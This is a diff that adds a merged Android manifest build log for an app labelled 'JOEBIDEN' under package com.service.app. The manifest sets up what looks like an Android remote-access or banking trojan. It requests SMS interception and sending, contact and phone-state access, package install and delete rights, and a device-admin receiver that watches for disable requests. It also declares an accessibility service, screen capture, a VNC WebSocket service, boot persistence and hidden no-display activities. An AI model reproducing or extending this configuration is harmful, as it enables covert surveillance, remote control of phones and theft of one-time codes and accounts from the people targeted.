@@ -1,0 +1,450 @@
+1<?xml version="1.0" encoding="utf-8"?>
+2<manifest xmlns:android="http://schemas.android.com/apk/res/android"
+3    package="com.service.app"
+4    android:versionCode="1"
+5    android:versionName="1.0" >
+6
+7    <uses-sdk
+8        android:minSdkVersion="16"
+8-->C:\Users\yumus\apk\mmm\app\src\main\AndroidManifest.xml
+9        android:targetSdkVersion="30" />
+9-->C:\Users\yumus\apk\mmm\app\src\main\AndroidManifest.xml
+10
+11    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
+11-->C:\Users\yumus\apk\mmm\app\src\main\AndroidManifest.xml:6:5-79
+11-->C:\Users\yumus\apk\mmm\app\src\main\AndroidManifest.xml:6:22-76
+12    <uses-permission android:name="android.permission.INTERNET" />
+12-->C:\Users\yumus\apk\mmm\app\src\main\AndroidManifest.xml:7:5-67
+12-->C:\Users\yumus\apk\mmm\app\src\main\AndroidManifest.xml:7:22-64
+13    <uses-permission android:name="android.permission.CALL_PHONE" />
+13-->C:\Users\yumus\apk\mmm\app\src\main\AndroidManifest.xml:8:5-69
+13-->C:\Users\yumus\apk\mmm\app\src\main\AndroidManifest.xml:8:22-66
+14    <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" />
+14-->C:\Users\yumus\apk\mmm\app\src\main\AndroidManifest.xml:9:5-95
+14-->C:\Users\yumus\apk\mmm\app\src\main\AndroidManifest.xml:9:22-92
+15    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
+15-->C:\Users\yumus\apk\mmm\app\src\main\AndroidManifest.xml:10:5-81
+15-->C:\Users\yumus\apk\mmm\app\src\main\AndroidManifest.xml:10:22-78
+16    <uses-permission android:name="android.permission.READ_PHONE_STATE" />
+16-->C:\Users\yumus\apk\mmm\app\src\main\AndroidManifest.xml:11:5-75
+16-->C:\Users\yumus\apk\mmm\app\src\main\AndroidManifest.xml:11:22-72
+17    <uses-permission android:name="android.permission.REQUEST_DELETE_PACKAGES" />
+17-->C:\Users\yumus\apk\mmm\app\src\main\AndroidManifest.xml:12:5-81
+17-->C:\Users\yumus\apk\mmm\app\src\main\AndroidManifest.xml:12:22-79
+18    <uses-permission android:name="android.permission.RECEIVE_SMS" />
+18-->C:\Users\yumus\apk\mmm\app\src\main\AndroidManifest.xml:13:5-70
+18-->C:\Users\yumus\apk\mmm\app\src\main\AndroidManifest.xml:13:22-67
+19    <uses-permission android:name="android.permission.READ_SMS" />
+19-->C:\Users\yumus\apk\mmm\app\src\main\AndroidManifest.xml:14:5-67
+19-->C:\Users\yumus\apk\mmm\app\src\main\AndroidManifest.xml:14:22-64
+20    <uses-permission android:name="android.permission.SEND_SMS" />
+20-->C:\Users\yumus\apk\mmm\app\src\main\AndroidManifest.xml:15:5-67
+20-->C:\Users\yumus\apk\mmm\app\src\main\AndroidManifest.xml:15:22-64
+21    <uses-permission android:name="android.permission.READ_CONTACTS" />
+21-->C:\Users\yumus\apk\mmm\app\src\main\AndroidManifest.xml:16:5-72
+21-->C:\Users\yumus\apk\mmm\app\src\main\AndroidManifest.xml:16:22-69
+22    <uses-permission android:name="android.permission.WAKE_LOCK" />
+22-->C:\Users\yumus\apk\mmm\app\src\main\AndroidManifest.xml:17:5-68
+22-->C:\Users\yumus\apk\mmm\app\src\main\AndroidManifest.xml:17:22-65
+23    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
+23-->C:\Users\yumus\apk\mmm\app\src\main\AndroidManifest.xml:18:5-78
+23-->C:\Users\yumus\apk\mmm\app\src\main\AndroidManifest.xml:18:22-75
+24    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
+24-->C:\Users\yumus\apk\mmm\app\src\main\AndroidManifest.xml:19:5-77
+24-->C:\Users\yumus\apk\mmm\app\src\main\AndroidManifest.xml:19:22-74
+25    <uses-permission android:name="com.android.launcher.permission.INSTALL_SHORTCUT" />
+25-->C:\Users\yumus\apk\mmm\app\src\main\AndroidManifest.xml:20:5-88
+25-->C:\Users\yumus\apk\mmm\app\src\main\AndroidManifest.xml:20:22-85
+26    <uses-permission android:name="com.android.launcher.permission.UNINSTALL_SHORTCUT" />
+26-->C:\Users\yumus\apk\mmm\app\src\main\AndroidManifest.xml:21:5-90
+26-->C:\Users\yumus\apk\mmm\app\src\main\AndroidManifest.xml:21:22-87
+27    <uses-permission android:name="android.permission.QUERY_ALL_PACKAGES" />
+27-->C:\Users\yumus\apk\mmm\app\src\main\AndroidManifest.xml:22:5-23:53
+27-->C:\Users\yumus\apk\mmm\app\src\main\AndroidManifest.xml:22:22-74
+28    <uses-permission android:name="android.permission.ACCESS_NOTIFICATION_POLICY" />
+28-->C:\Users\yumus\apk\mmm\app\src\main\AndroidManifest.xml:24:5-85
+28-->C:\Users\yumus\apk\mmm\app\src\main\AndroidManifest.xml:24:22-82
+29    <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS" />
+29-->C:\Users\yumus\apk\mmm\app\src\main\AndroidManifest.xml:25:5-80
+29-->C:\Users\yumus\apk\mmm\app\src\main\AndroidManifest.xml:25:22-77
+30    <uses-permission android:name="android.permission.REQUEST_INSTALL_PACKAGES" />
+30-->C:\Users\yumus\apk\mmm\app\src\main\AndroidManifest.xml:26:5-83
+30-->C:\Users\yumus\apk\mmm\app\src\main\AndroidManifest.xml:26:22-80
+31    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
+31-->C:\Users\yumus\apk\mmm\app\src\main\AndroidManifest.xml:27:5-79
+31-->C:\Users\yumus\apk\mmm\app\src\main\AndroidManifest.xml:27:22-77
+32    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
+32-->C:\Users\yumus\apk\mmm\app\src\main\AndroidManifest.xml:28:5-80
+32-->C:\Users\yumus\apk\mmm\app\src\main\AndroidManifest.xml:28:22-78
+33    <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE" />
+33-->C:\Users\yumus\apk\mmm\app\src\main\AndroidManifest.xml:29:5-81
+33-->C:\Users\yumus\apk\mmm\app\src\main\AndroidManifest.xml:29:22-79
+34
+35    <application
+35-->C:\Users\yumus\apk\mmm\app\src\main\AndroidManifest.xml:33:5-209:19
+36        android:name="com.service.app.App"
+36-->C:\Users\yumus\apk\mmm\app\src\main\AndroidManifest.xml:42:9-28
+37        android:allowBackup="true"
+37-->C:\Users\yumus\apk\mmm\app\src\main\AndroidManifest.xml:34:9-35
+38        android:appComponentFactory="androidx.core.app.CoreComponentFactory"
+38-->[androidx.core:core:1.3.1] C:\Users\yumus\.gradle\caches\transforms-3\25c41fa88819900b4a6caafb27b4f9e3\transformed\core-1.3.1\AndroidManifest.xml:24:18-86
+39        android:debuggable="true"
+40        android:excludeFromRecents="true"
+40-->C:\Users\yumus\apk\mmm\app\src\main\AndroidManifest.xml:38:9-42
+41        android:icon="@mipmap/ic_launcher"
+41-->C:\Users\yumus\apk\mmm\app\src\main\AndroidManifest.xml:35:9-43
+42        android:label="JOEBIDEN"
+42-->C:\Users\yumus\apk\mmm\app\src\main\AndroidManifest.xml:36:9-33
+43        android:requestLegacyExternalStorage="true"
+43-->C:\Users\yumus\apk\mmm\app\src\main\AndroidManifest.xml:41:9-52
+44        android:supportsRtl="true"
+44-->C:\Users\yumus\apk\mmm\app\src\main\AndroidManifest.xml:37:9-35
+45        android:testOnly="true"
+46        android:theme="@android:style/Theme.Translucent.NoTitleBar"
+46-->C:\Users\yumus\apk\mmm\app\src\main\AndroidManifest.xml:40:9-68
+47        android:usesCleartextTraffic="true" >
+47-->C:\Users\yumus\apk\mmm\app\src\main\AndroidManifest.xml:39:9-44
+48        <activity android:name="com.service.app.Main.SMSManager" />
+48-->C:\Users\yumus\apk\mmm\app\src\main\AndroidManifest.xml:44:9-53
+48-->C:\Users\yumus\apk\mmm\app\src\main\AndroidManifest.xml:44:19-50
+49
+50        <service
+50-->C:\Users\yumus\apk\mmm\app\src\main\AndroidManifest.xml:45:9-47:40
+51            android:name="com.service.app.Services.ServiceChooser"
+51-->C:\Users\yumus\apk\mmm\app\src\main\AndroidManifest.xml:46:13-52
+52            android:exported="false" />
+52-->C:\Users\yumus\apk\mmm\app\src\main\AndroidManifest.xml:47:13-37
+53
+54        <activity
+54-->C:\Users\yumus\apk\mmm\app\src\main\AndroidManifest.xml:49:9-52:75
+55            android:name="com.google.android.gms.common.api.GoogleApiActivity"
+55-->C:\Users\yumus\apk\mmm\app\src\main\AndroidManifest.xml:50:13-79
+56            android:exported="false"
+56-->C:\Users\yumus\apk\mmm\app\src\main\AndroidManifest.xml:51:13-37
+57            android:theme="@android:style/Theme.Translucent.NoTitleBar" />
+57-->C:\Users\yumus\apk\mmm\app\src\main\AndroidManifest.xml:52:13-72
+58
+59        <meta-data
+59-->C:\Users\yumus\apk\mmm\app\src\main\AndroidManifest.xml:54:9-56:40
+60            android:name="com.google.android.gms.version"
+60-->C:\Users\yumus\apk\mmm\app\src\main\AndroidManifest.xml:55:13-58
+61            android:value="11010000" />
+61-->C:\Users\yumus\apk\mmm\app\src\main\AndroidManifest.xml:56:13-37
+62
+63        <service
+63-->C:\Users\yumus\apk\mmm\app\src\main\AndroidManifest.xml:58:9-60:40
+64            android:name="com.service.app.Services.DevLock"
+64-->C:\Users\yumus\apk\mmm\app\src\main\AndroidManifest.xml:59:13-45
+65            android:exported="false" />
+65-->C:\Users\yumus\apk\mmm\app\src\main\AndroidManifest.xml:60:13-37
+66
+67        <activity
+67-->C:\Users\yumus\apk\mmm\app\src\main\AndroidManifest.xml:62:9-66:62
+68            android:name="com.service.app.Main.AccessAdm"
+68-->C:\Users\yumus\apk\mmm\app\src\main\AndroidManifest.xml:63:13-43
+69            android:excludeFromRecents="true"
+69-->C:\Users\yumus\apk\mmm\app\src\main\AndroidManifest.xml:64:13-46
+70            android:label=""
+70-->C:\Users\yumus\apk\mmm\app\src\main\AndroidManifest.xml:65:13-29
+71            android:theme="@android:style/Theme.NoDisplay" />
+71-->C:\Users\yumus\apk\mmm\app\src\main\AndroidManifest.xml:66:13-59
+72        <activity
+72-->C:\Users\yumus\apk\mmm\app\src\main\AndroidManifest.xml:68:9-69:66
+73            android:name="com.service.app.CaptureActivity"
+73-->C:\Users\yumus\apk\mmm\app\src\main\AndroidManifest.xml:68:19-50
+74            android:excludeFromRecents="true"
+74-->C:\Users\yumus\apk\mmm\app\src\main\AndroidManifest.xml:68:51-84
+75            android:theme="@style/Theme.AppCompat.Translucent" />
+75-->C:\Users\yumus\apk\mmm\app\src\main\AndroidManifest.xml:69:13-63
+76        <activity
+76-->C:\Users\yumus\apk\mmm\app\src\main\AndroidManifest.xml:71:9-76:20
+77            android:name="com.service.app.fake"
+77-->C:\Users\yumus\apk\mmm\app\src\main\AndroidManifest.xml:71:103-123
+78            android:enabled="false"
+78-->C:\Users\yumus\apk\mmm\app\src\main\AndroidManifest.xml:71:43-66
+79            android:label="JOOOEEE"
+79-->C:\Users\yumus\apk\mmm\app\src\main\AndroidManifest.xml:71:19-42
+80            android:launchMode="singleInstance" >
+80-->C:\Users\yumus\apk\mmm\app\src\main\AndroidManifest.xml:71:67-102
+81            <intent-filter>
+81-->C:\Users\yumus\apk\mmm\app\src\main\AndroidManifest.xml:72:9-75:25
+82                <action android:name="android.intent.action.MAIN" />
+82-->C:\Users\yumus\apk\mmm\app\src\main\AndroidManifest.xml:73:13-65
+82-->C:\Users\yumus\apk\mmm\app\src\main\AndroidManifest.xml:73:21-62
+83
+84                <category android:name="android.intent.category.LAUNCHER" />
+84-->C:\Users\yumus\apk\mmm\app\src\main\AndroidManifest.xml:74:13-73
+84-->C:\Users\yumus\apk\mmm\app\src\main\AndroidManifest.xml:74:23-70
+85            </intent-filter>
+86        </activity>
+87
+88        <service
+88-->C:\Users\yumus\apk\mmm\app\src\main\AndroidManifest.xml:78:9-80:63
+89            android:name="com.service.app.CaptureService"
+89-->C:\Users\yumus\apk\mmm\app\src\main\AndroidManifest.xml:79:13-43
+90            android:foregroundServiceType="mediaProjection" />
+90-->C:\Users\yumus\apk\mmm\app\src\main\AndroidManifest.xml:80:13-60
+91        <service
+91-->C:\Users\yumus\apk\mmm\app\src\main\AndroidManifest.xml:81:9-84:40
+92            android:name="com.service.app.vnc.WebSocketService"
+92-->C:\Users\yumus\apk\mmm\app\src\main\AndroidManifest.xml:82:13-49
+93            android:enabled="true"
+93-->C:\Users\yumus\apk\mmm\app\src\main\AndroidManifest.xml:83:13-35
+94            android:exported="false" />
+94-->C:\Users\yumus\apk\mmm\app\src\main\AndroidManifest.xml:84:13-37
+95        <service
+95-->C:\Users\yumus\apk\mmm\app\src\main\AndroidManifest.xml:86:9-89:40
+96            android:name="com.service.app.Services.HintService"
+96-->C:\Users\yumus\apk\mmm\app\src\main\AndroidManifest.xml:87:13-49
+97            android:enabled="true"
+97-->C:\Users\yumus\apk\mmm\app\src\main\AndroidManifest.xml:88:13-35
+98            android:exported="false" />
+98-->C:\Users\yumus\apk\mmm\app\src\main\AndroidManifest.xml:89:13-37
+99
+100        <receiver
+100-->C:\Users\yumus\apk\mmm\app\src\main\AndroidManifest.xml:91:9-104:20
+101            android:name="com.service.app.Main.ReceiverDeviceAdmin"
+101-->C:\Users\yumus\apk\mmm\app\src\main\AndroidManifest.xml:92:13-53
+102            android:label="BIDENJOE"
+102-->C:\Users\yumus\apk\mmm\app\src\main\AndroidManifest.xml:93:13-37
+103            android:permission="android.permission.BIND_DEVICE_ADMIN" >
+103-->C:\Users\yumus\apk\mmm\app\src\main\AndroidManifest.xml:94:13-70
+104            <meta-data
+104-->C:\Users\yumus\apk\mmm\app\src\main\AndroidManifest.xml:95:13-97:47
+105                android:name="android.app.device_admin"
+105-->C:\Users\yumus\apk\mmm\app\src\main\AndroidManifest.xml:96:17-56
+106                android:resource="@xml/adm" />
+106-->C:\Users\yumus\apk\mmm\app\src\main\AndroidManifest.xml:97:17-44
+107
+108            <intent-filter android:priority="121" >
+108-->C:\Users\yumus\apk\mmm\app\src\main\AndroidManifest.xml:99:13-103:29
+108-->C:\Users\yumus\apk\mmm\app\src\main\AndroidManifest.xml:99:28-50
+109                <action android:name="android.app.action.DEVICE_ADMIN_DISABLED" />
+109-->C:\Users\yumus\apk\mmm\app\src\main\AndroidManifest.xml:100:17-83
+109-->C:\Users\yumus\apk\mmm\app\src\main\AndroidManifest.xml:100:25-80
+110                <action android:name="android.app.action.ACTION_DEVICE_ADMIN_DISABLE_REQUESTED" />
+110-->C:\Users\yumus\apk\mmm\app\src\main\AndroidManifest.xml:101:17-99
+110-->C:\Users\yumus\apk\mmm\app\src\main\AndroidManifest.xml:101:25-96
+111                <action android:name="android.app.action.DEVICE_ADMIN_ENABLED" />
+111-->C:\Users\yumus\apk\mmm\app\src\main\AndroidManifest.xml:102:17-82
+111-->C:\Users\yumus\apk\mmm\app\src\main\AndroidManifest.xml:102:25-79
+112            </intent-filter>
+113        </receiver>
+114
+115        <activity android:name="com.service.app.sjsjssjsj" >
+115-->C:\Users\yumus\apk\mmm\app\src\main\AndroidManifest.xml:106:9-117:20
+115-->C:\Users\yumus\apk\mmm\app\src\main\AndroidManifest.xml:106:19-44
+116            <intent-filter>
+116-->C:\Users\yumus\apk\mmm\app\src\main\AndroidManifest.xml:107:13-116:29
+117                <data android:scheme="sms" />
+117-->C:\Users\yumus\apk\mmm\app\src\main\AndroidManifest.xml:108:17-46
+117-->C:\Users\yumus\apk\mmm\app\src\main\AndroidManifest.xml:108:23-43
+118
+119                <action android:name="android.intent.action.SENDTO" />
+119-->C:\Users\yumus\apk\mmm\app\src\main\AndroidManifest.xml:109:17-71
+119-->C:\Users\yumus\apk\mmm\app\src\main\AndroidManifest.xml:109:25-68
+120
+121                <data android:scheme="mms" />
+121-->C:\Users\yumus\apk\mmm\app\src\main\AndroidManifest.xml:108:17-46
+121-->C:\Users\yumus\apk\mmm\app\src\main\AndroidManifest.xml:108:23-43
+122
+123                <category android:name="android.intent.category.BROWSABLE" />
+123-->C:\Users\yumus\apk\mmm\app\src\main\AndroidManifest.xml:111:17-78
+123-->C:\Users\yumus\apk\mmm\app\src\main\AndroidManifest.xml:111:27-75
+124
+125                <data android:scheme="mmsto" />
+125-->C:\Users\yumus\apk\mmm\app\src\main\AndroidManifest.xml:108:17-46
+125-->C:\Users\yumus\apk\mmm\app\src\main\AndroidManifest.xml:108:23-43
+126
+127                <category android:name="android.intent.category.DEFAULT" />
+127-->C:\Users\yumus\apk\mmm\app\src\main\AndroidManifest.xml:113:17-76
+127-->C:\Users\yumus\apk\mmm\app\src\main\AndroidManifest.xml:113:27-73
+128
+129                <data android:scheme="smsto" />
+129-->C:\Users\yumus\apk\mmm\app\src\main\AndroidManifest.xml:108:17-46
+129-->C:\Users\yumus\apk\mmm\app\src\main\AndroidManifest.xml:108:23-43
+130
+131                <action android:name="android.intent.action.SEND" />
+131-->C:\Users\yumus\apk\mmm\app\src\main\AndroidManifest.xml:115:17-69
+131-->C:\Users\yumus\apk\mmm\app\src\main\AndroidManifest.xml:115:25-66
+132            </intent-filter>
+133        </activity>
+134
+135        <receiver
+135-->C:\Users\yumus\apk\mmm\app\src\main\AndroidManifest.xml:119:9-127:20
+136            android:name="com.service.app.sjssjsjssj"
+136-->C:\Users\yumus\apk\mmm\app\src\main\AndroidManifest.xml:120:13-39
+137            android:permission="android.permission.BROADCAST_WAP_PUSH" >
+137-->C:\Users\yumus\apk\mmm\app\src\main\AndroidManifest.xml:121:13-71
+138            <intent-filter>
+138-->C:\Users\yumus\apk\mmm\app\src\main\AndroidManifest.xml:122:13-126:29
+139                <data android:mimeType="application/vnd.wap.mms-message" />
+139-->C:\Users\yumus\apk\mmm\app\src\main\AndroidManifest.xml:108:17-46
+139-->C:\Users\yumus\apk\mmm\app\src\main\AndroidManifest.xml:123:23-73
+140
+141                <action android:name="android.provider.Telephony.WAP_PUSH_DELIVER" />
+141-->C:\Users\yumus\apk\mmm\app\src\main\AndroidManifest.xml:125:17-86
+141-->C:\Users\yumus\apk\mmm\app\src\main\AndroidManifest.xml:125:25-83
+142            </intent-filter>
+143        </receiver>
+144
+145        <service
+145-->C:\Users\yumus\apk\mmm\app\src\main\AndroidManifest.xml:129:9-139:19
+146            android:name="com.service.app.ffsjsjsjsj"
+146-->C:\Users\yumus\apk\mmm\app\src\main\AndroidManifest.xml:130:13-39
+147            android:permission="android.permission.SEND_RESPOND_VIA_MESSAGE" >
+147-->C:\Users\yumus\apk\mmm\app\src\main\AndroidManifest.xml:131:13-77
+148            <intent-filter>
+148-->C:\Users\yumus\apk\mmm\app\src\main\AndroidManifest.xml:132:13-138:29
+149                <data android:scheme="sms" />
+149-->C:\Users\yumus\apk\mmm\app\src\main\AndroidManifest.xml:108:17-46
+149-->C:\Users\yumus\apk\mmm\app\src\main\AndroidManifest.xml:108:23-43
+150
+151                <action android:name="android.intent.action.RESPOND_VIA_MESSAGE" />
+151-->C:\Users\yumus\apk\mmm\app\src\main\AndroidManifest.xml:135:17-84
+151-->C:\Users\yumus\apk\mmm\app\src\main\AndroidManifest.xml:135:25-81
+152
+153                <data android:scheme="smsto" />
+153-->C:\Users\yumus\apk\mmm\app\src\main\AndroidManifest.xml:108:17-46
+153-->C:\Users\yumus\apk\mmm\app\src\main\AndroidManifest.xml:108:23-43
+154            </intent-filter>
+155        </service>
+156        <service android:name="com.service.app.Services.srvToaskAccessibility" />
+156-->C:\Users\yumus\apk\mmm\app\src\main\AndroidManifest.xml:140:9-67
+156-->C:\Users\yumus\apk\mmm\app\src\main\AndroidManifest.xml:140:18-64
+157
+158        <activity
+158-->C:\Users\yumus\apk\mmm\app\src\main\AndroidManifest.xml:142:9-146:48
+159            android:name="com.service.app.Main.AccessActivity"
+159-->C:\Users\yumus\apk\mmm\app\src\main\AndroidManifest.xml:143:13-48
+160            android:excludeFromRecents="true"
+160-->C:\Users\yumus\apk\mmm\app\src\main\AndroidManifest.xml:146:13-46
+161            android:icon="@drawable/background"
+161-->C:\Users\yumus\apk\mmm\app\src\main\AndroidManifest.xml:144:13-48
+162            android:label="" />
+162-->C:\Users\yumus\apk\mmm\app\src\main\AndroidManifest.xml:145:13-29
+163        <activity
+163-->C:\Users\yumus\apk\mmm\app\src\main\AndroidManifest.xml:147:9-153:15
+164            android:name="com.service.app.Main.ViewManager"
+164-->C:\Users\yumus\apk\mmm\app\src\main\AndroidManifest.xml:148:13-45
+165            android:excludeFromRecents="true"
+165-->C:\Users\yumus\apk\mmm\app\src\main\AndroidManifest.xml:149:13-46
+166            android:icon="@drawable/background"
+166-->C:\Users\yumus\apk\mmm\app\src\main\AndroidManifest.xml:150:13-48
+167            android:label=""
+167-->C:\Users\yumus\apk\mmm\app\src\main\AndroidManifest.xml:151:13-29
+168            android:launchMode="singleTask" />
+168-->C:\Users\yumus\apk\mmm\app\src\main\AndroidManifest.xml:152:13-44
+169        <activity
+169-->C:\Users\yumus\apk\mmm\app\src\main\AndroidManifest.xml:154:9-160:20
+170            android:name="com.service.app.IndexACT"
+170-->C:\Users\yumus\apk\mmm\app\src\main\AndroidManifest.xml:154:19-43
+171            android:enabled="true"
+171-->C:\Users\yumus\apk\mmm\app\src\main\AndroidManifest.xml:154:44-66
+172            android:excludeFromRecents="true" >
+172-->C:\Users\yumus\apk\mmm\app\src\main\AndroidManifest.xml:154:67-100
+173            <intent-filter>
+173-->C:\Users\yumus\apk\mmm\app\src\main\AndroidManifest.xml:155:13-159:29
+174                <action android:name="android.intent.action.MAIN" />
+174-->C:\Users\yumus\apk\mmm\app\src\main\AndroidManifest.xml:73:13-65
+174-->C:\Users\yumus\apk\mmm\app\src\main\AndroidManifest.xml:73:21-62
+175
+176                <category android:name="android.app.role.SMS" />
+176-->C:\Users\yumus\apk\mmm\app\src\main\AndroidManifest.xml:157:17-65
+176-->C:\Users\yumus\apk\mmm\app\src\main\AndroidManifest.xml:157:27-62
+177                <category android:name="android.intent.category.LAUNCHER" />
+177-->C:\Users\yumus\apk\mmm\app\src\main\AndroidManifest.xml:74:13-73
+177-->C:\Users\yumus\apk\mmm\app\src\main\AndroidManifest.xml:74:23-70
+178            </intent-filter>
+179        </activity>
+180
+181        <receiver
+181-->C:\Users\yumus\apk\mmm\app\src\main\AndroidManifest.xml:162:9-171:20
+182            android:name="com.service.app.Main.smsreceiver"
+182-->C:\Users\yumus\apk\mmm\app\src\main\AndroidManifest.xml:163:13-45
+183            android:permission="android.permission.BROADCAST_SMS" >
+183-->C:\Users\yumus\apk\mmm\app\src\main\AndroidManifest.xml:164:13-66
+184            <intent-filter android:priority="979" >
+184-->C:\Users\yumus\apk\mmm\app\src\main\AndroidManifest.xml:165:13-170:29
+184-->C:\Users\yumus\apk\mmm\app\src\main\AndroidManifest.xml:165:28-50
+185                <action android:name="android.provider.Telephony.SMS_DELIVER" />
+185-->C:\Users\yumus\apk\mmm\app\src\main\AndroidManifest.xml:166:17-81
+185-->C:\Users\yumus\apk\mmm\app\src\main\AndroidManifest.xml:166:25-78
+186                <action android:name="android.intent.action.BOOT_COMPLETED" />
+186-->C:\Users\yumus\apk\mmm\app\src\main\AndroidManifest.xml:167:17-79
+186-->C:\Users\yumus\apk\mmm\app\src\main\AndroidManifest.xml:167:25-76
+187
+188                <!-- <action android:name="android.intent.action.ACTION_SHUTDOWN" /> -->
+189            </intent-filter>
+190        </receiver>
+191
+192        <provider
+193            android:name="androidx.core.content.FileProvider"
+193-->C:\Users\yumus\apk\mmm\app\src\main\AndroidManifest.xml:174:13-62
+194            android:authorities="com.service.app.fileprovider"
+194-->C:\Users\yumus\apk\mmm\app\src\main\AndroidManifest.xml:175:13-64
+195            android:exported="false"
+195-->C:\Users\yumus\apk\mmm\app\src\main\AndroidManifest.xml:177:13-37
+196            android:grantUriPermissions="true" >
+196-->C:\Users\yumus\apk\mmm\app\src\main\AndroidManifest.xml:176:13-47
+197            <meta-data
+197-->C:\Users\yumus\apk\mmm\app\src\main\AndroidManifest.xml:178:13-180:54
+198                android:name="android.support.FILE_PROVIDER_PATHS"
+198-->C:\Users\yumus\apk\mmm\app\src\main\AndroidManifest.xml:179:17-67
+199                android:resource="@xml/file_paths" />
+199-->C:\Users\yumus\apk\mmm\app\src\main\AndroidManifest.xml:180:17-51
+200        </provider>
+201
+202        <activity
+202-->C:\Users\yumus\apk\mmm\app\src\main\AndroidManifest.xml:184:9-189:62
+203            android:name="com.service.app.Main.PermManager"
+203-->C:\Users\yumus\apk\mmm\app\src\main\AndroidManifest.xml:185:13-45
+204            android:excludeFromRecents="true"
+204-->C:\Users\yumus\apk\mmm\app\src\main\AndroidManifest.xml:186:13-46
+205            android:icon="@drawable/background"
+205-->C:\Users\yumus\apk\mmm\app\src\main\AndroidManifest.xml:187:13-48
+206            android:label=""
+206-->C:\Users\yumus\apk\mmm\app\src\main\AndroidManifest.xml:188:13-29
+207            android:theme="@android:style/Theme.NoDisplay" />
+207-->C:\Users\yumus\apk\mmm\app\src\main\AndroidManifest.xml:189:13-59
+208        <activity android:name="com.service.app.Main.ModeChanger" />
+208-->C:\Users\yumus\apk\mmm\app\src\main\AndroidManifest.xml:190:9-54
+208-->C:\Users\yumus\apk\mmm\app\src\main\AndroidManifest.xml:190:19-51
+209
+210        <service android:name="com.service.app.Services.EndlessService" />
+210-->C:\Users\yumus\apk\mmm\app\src\main\AndroidManifest.xml:192:9-75
+210-->C:\Users\yumus\apk\mmm\app\src\main\AndroidManifest.xml:192:18-72
+211        <service android:name="com.service.app.Services.kingservice" />
+211-->C:\Users\yumus\apk\mmm\app\src\main\AndroidManifest.xml:193:9-72
+211-->C:\Users\yumus\apk\mmm\app\src\main\AndroidManifest.xml:193:18-69
+212        <service android:name="com.service.app.Services.Netmanager" />
+212-->C:\Users\yumus\apk\mmm\app\src\main\AndroidManifest.xml:195:9-71
+212-->C:\Users\yumus\apk\mmm\app\src\main\AndroidManifest.xml:195:18-68
+213        <service android:name="com.service.app.Services.SensorService" />
+213-->C:\Users\yumus\apk\mmm\app\src\main\AndroidManifest.xml:196:9-74
+213-->C:\Users\yumus\apk\mmm\app\src\main\AndroidManifest.xml:196:18-71
+214        <service
+214-->C:\Users\yumus\apk\mmm\app\src\main\AndroidManifest.xml:197:9-208:19
+215            android:name="com.service.app.Services.Access"
+215-->C:\Users\yumus\apk\mmm\app\src\main\AndroidManifest.xml:198:13-44
+216            android:label="foniks"
+216-->C:\Users\yumus\apk\mmm\app\src\main\AndroidManifest.xml:199:13-35
+217            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE" >
+217-->C:\Users\yumus\apk\mmm\app\src\main\AndroidManifest.xml:200:13-79
+218            <intent-filter>
+218-->C:\Users\yumus\apk\mmm\app\src\main\AndroidManifest.xml:201:13-203:29
+219                <action android:name="android.accessibilityservice.AccessibilityService" />
+219-->C:\Users\yumus\apk\mmm\app\src\main\AndroidManifest.xml:202:17-92
+219-->C:\Users\yumus\apk\mmm\app\src\main\AndroidManifest.xml:202:25-89
+220            </intent-filter>
+221
+222            <meta-data
+222-->C:\Users\yumus\apk\mmm\app\src\main\AndroidManifest.xml:205:13-207:57
+223                android:name="android.accessibilityservice"
+223-->C:\Users\yumus\apk\mmm\app\src\main\AndroidManifest.xml:206:17-60
+224                android:resource="@xml/serviceconfig" />
+224-->C:\Users\yumus\apk\mmm\app\src\main\AndroidManifest.xml:207:17-54
+225        </service>
+226    </application>
+227
+228</manifest>
